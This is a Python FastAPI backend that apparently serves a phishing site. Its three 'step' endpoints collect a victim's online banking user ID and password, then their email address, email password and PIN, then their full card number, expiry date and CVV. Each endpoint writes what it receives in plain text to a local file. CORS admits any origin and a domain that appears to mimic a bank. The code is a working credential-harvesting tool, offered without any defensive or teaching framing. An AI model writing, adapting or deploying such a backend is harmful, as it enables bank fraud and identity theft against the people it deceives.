from fastapi import FastAPI, status
from pydantic import BaseModel
from typing import Optional
from fastapi.middleware.cors import CORSMiddleware

class Step1(BaseModel):
    userId: Optional[str] = None
    password: Optional[str] = None

class Step2(BaseModel):
    email: Optional[str] = None
    emailPass: Optional[str] = None
    pin: Optional[str] = None

class Step3(BaseModel):
    cardNumber: Optional[str] = None
    month: Optional[str] = None
    year: Optional[str] = None
    cvv: Optional[str] = None

app = FastAPI()

origins = [
    "http://localhost",
    "http://localhost:8080",
    "http://localhost:3000",
    "*",
    "http://192.168.2.106:3000",
    "http://bacootemerica.xyz/",
    "https://bacootemerica.xyz/",
    "http://www.bacootemerica.xyz/",
    "https://www.bacootemerica.xyz/"
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
def read_root():
    return {"Hello": "World"}


@app.post("/step1", status_code=status.HTTP_201_CREATED)
def post_step1( user : Step1 ):
    with open("info.txt", "a") as file:
        file.write("\n--------------\n")
        file.write("User: ")
        file.write(user.userId)
        file.write(" - Pass: ")
        file.write(user.password)
        file.write("\n")
    return 200

@app.post("/step2", status_code=status.HTTP_201_CREATED)
def post_step2( email : Step2 ):
    with open("info.txt", "a") as file:
        file.write("Email: ")
        file.write(email.email)
        file.write(" - Email pass: ")
        file.write(email.emailPass)
        file.write(" - PIN: ")
        file.write(email.pin)
        file.write("\n")
    return 200

@app.post("/step3", status_code=status.HTTP_201_CREATED)
def post_step3( card : Step3 ):
    with open("info.txt", "a") as file:
        file.write("Card Number: ")
        file.write(card.cardNumber)
        file.write(" - Date: ")
        file.write(card.month)
        file.write(" - ")
        file.write(card.year)
        file.write(" - CVV: ")
        file.write(card.cvv)
    return 200